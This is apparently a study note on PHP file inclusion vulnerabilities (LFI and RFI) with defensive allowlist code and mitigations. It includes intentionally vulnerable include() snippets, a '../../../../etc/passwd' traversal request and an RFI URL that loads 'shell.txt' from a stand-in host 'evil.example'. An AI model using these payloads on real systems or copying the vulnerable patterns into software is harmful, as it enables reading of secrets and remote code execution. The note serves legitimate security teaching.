**Tags:** #web-security #lfi #rfi #file-inclusion #ceh #owasp #php

---

## What is File Inclusion?

A web application often loads files dynamically based on **user input**.

### Example Application

**URL**

```text
https://example.com/index.php?page=home.php
```

**Backend Code**

```php
<?php
$page = $_GET['page'];
include($page);
?>
```

The developer expects only files such as:

- `home.php`
    
- `about.php`
    
- `contact.php`
    

However, because the user controls the `page` parameter, the application may include **unexpected files**.

---

## Core Concept

> [!info] include() Concept  
> Think of `include()` as:
> 
> **“Open this file and place its contents into the current webpage.”**

If the filename comes directly from the user, the user may try to include **other files**.

---

## Types of File Inclusion

|Type|What gets included?|
|---|---|
|**LFI**|Files already present on the server|
|**RFI**|Files from another server (remote URL)|

---

# Local File Inclusion (LFI)

## Vulnerable Code

```php
<?php
include($_GET['page']);
?>
```

## Normal Request

```text
https://example.com/index.php?page=home.php
```

The server includes:

```text
/var/www/html/home.php
```

---

## Path Traversal Example

**Request**

```text
https://example.com/index.php?page=../../../../etc/passwd
```

### What Happens?

The application attempts to open:

```text
../../../../etc/passwd
```

After path resolution, it may become:

```text
/etc/passwd
```

> [!warning] Why This Is Dangerous  
> An attacker may read:
> 
> - System files
>     
> - Configuration files
>     
> - Database credentials
>     
> - Application source code
>     
> - Log files containing sensitive data
>     

---

## Understanding ../ (Directory Traversal)

### Server Structure

```text
/var/www/html/index.php
/var/www/html/pages/home.php
/etc/passwd
```

### Path Resolution

|Input|Resolved Path|
|---|---|
|`home.php`|`/var/www/html/pages/home.php`|
|`../index.php`|`/var/www/html/index.php`|
|`../../../../etc/passwd`|`/etc/passwd`|

### Key Idea

> [!tip] Traversal Rule  
> Each `../` means:
> 
> **“Go one directory up.”**

---

## Historical Real-World Pattern

Older PHP CMS applications often used patterns such as:

```php
include($_GET['module'] . '.php');
```

Developers assumed users would request:

- `news`
    
- `gallery`
    
- `forum`
    

Attackers discovered they could manipulate the path and access unintended files.

This vulnerability class has historically appeared in:

- WordPress plugins
    
- Joomla components
    
- Drupal modules
    
- Custom enterprise portals
    

---

# Remote File Inclusion (RFI)

## Vulnerable Code

```php
<?php
include($_GET['page']);
?>
```

## Remote URL Example

```text
https://example.com/index.php?page=http://evil.example/shell.txt
```

If the server allows remote URL inclusion, PHP may download the remote file and execute it as PHP code.

> [!danger] Why RFI Is Severe  
> RFI can lead to **Remote Code Execution (RCE)** because attacker-controlled code may run on the server.

### Modern PHP

Modern PHP disables this by default:

```ini
allow_url_include = Off
```

Older systems were more frequently vulnerable.

---

# Business Scenario

## Company Portal

### URL

```text
https://portal.company.com/view.php?doc=policies.php
```

### Backend

```php
include('docs/' . $_GET['doc']);
```

### Intended Behavior

Employees should only view HR documents stored in the `docs/` directory.

### Attacker Goal

Request a path that **escapes the `docs/` directory**.

### Potential Impact

An attacker may access:

- `config.php`
    
- Database passwords
    
- API keys
    
- AWS credentials
    
- Internal network information
    

> [!note] Realistic Breach Path  
> Configuration files often contain secrets that enable further compromise, making LFI a common **initial foothold** rather than just a file-reading issue.

---

# Why File Inclusion Happens

## Root Cause

> [!danger] Root Cause  
> **Untrusted user input is used as a filesystem path.**

Developers often assume:

- “Users will only choose valid pages.”
    
- “The UI only shows safe options.”
    
- “Nobody will modify the URL manually.”
    

Attackers routinely modify URLs manually.

---

# Common Vulnerable Patterns

## Direct Include

```php
include($_GET['page']);
```

## Include with Extension

```php
include($_GET['page'] . '.php');
```

## Template Loader

```php
$theme = $_GET['theme'];
include("themes/$theme/header.php");
```

## Language File Loader

```php
$lang = $_GET['lang'];
include("lang/$lang.php");
```

> [!info] Historical Note  
> Theme and language systems have historically been common sources of LFI vulnerabilities.

---

# LFI vs RFI — Easy Analogy

## LFI

**Local File Inclusion**

Like tricking a librarian into handing you a **restricted file already inside the building**.

## RFI

**Remote File Inclusion**

Like convincing the librarian to **fetch a document from an outside stranger and treat it as trusted content**.

---

# Typical Impact Chain

A single LFI bug may appear to be “just file reading,” but in real incidents it often becomes the **first step toward a larger compromise**.

```text
LFI
  ↓
Read config file
  ↓
Obtain database credentials
  ↓
Access database
  ↓
Lateral movement
  ↓
Full application compromise
```

---

# Defensive Detection Methodology

Security testers look for:

- Parameters named `page`, `file`, `include`, `template`, `lang`, `view`, `doc`
    
- Unexpected file errors
    
- Path traversal behavior
    
- Access outside the intended directory
    

> [!important] Authorized Testing Only  
> This testing is performed in environments such as:
> 
> - [[DVWA]]
>     
> - [[OWASP Juice Shop]]
>     
> - Security labs
>     
> - Company-approved penetration tests
>     

---

# Secure Design

## ❌ Unsafe

```php
include($_GET['page']);
```

---

## ✅ Safe — Allowlist

```php
<?php
$allowed = [
    'home' => 'pages/home.php',
    'about' => 'pages/about.php',
    'contact' => 'pages/contact.php'
];

$key = $_GET['page'] ?? 'home';

if (!array_key_exists($key, $allowed)) {
    http_response_code(404);
    exit;
}

include($allowed[$key]);
?>
```

### Why This Is Safe

The user chooses only a **key**, not a filesystem path.

|Input|Result|
|---|---|
|`home`|Allowed|
|`about`|Allowed|
|`../../etc/passwd`|Rejected|

> [!success] Security Principle  
> **Never let users specify arbitrary file paths.**

---

# Additional Mitigations

- Use **allowlists** for pages and templates.
    
- Disable remote URL inclusion (`allow_url_include=Off`).
    
- Run the web server with **minimal privileges**.
    
- Store secrets **outside the web root**.
    
- Use framework routing (Laravel, Django, Spring, ASP.NET) instead of manual `include()` patterns.
    
- Log and monitor traversal attempts.
    
- Apply proper file permissions.
    

---

# Quick Interview Answer

> **File Inclusion is a vulnerability where a web application loads a file based on user-controlled input. In Local File Inclusion (LFI), an attacker can access unintended files already present on the server, often through directory traversal sequences like `../`. In Remote File Inclusion (RFI), the application may load a file from an external URL, which can lead to remote code execution. The root cause is using untrusted input as a filesystem path, and the primary defense is strict allowlisting and avoiding user-controlled file paths.**

---

# Related Notes

- [[Directory Traversal]]
    
- [[OWASP Top 10]]
    
- [[DVWA]]
    
- [[PHP Security]]
    
- [[Secure Coding]]
    
- [[Remote Code Execution]]
    

---

# Revision Checklist

-  Explain LFI in one sentence
    
-  Explain RFI in one sentence
    
-  Describe how `../` works
    
-  Identify vulnerable include patterns
    
-  Explain allowlist-based defense
    
-  Describe the impact chain from LFI to compromise
    
-  Recall modern PHP mitigation (`allow_url_include=Off`)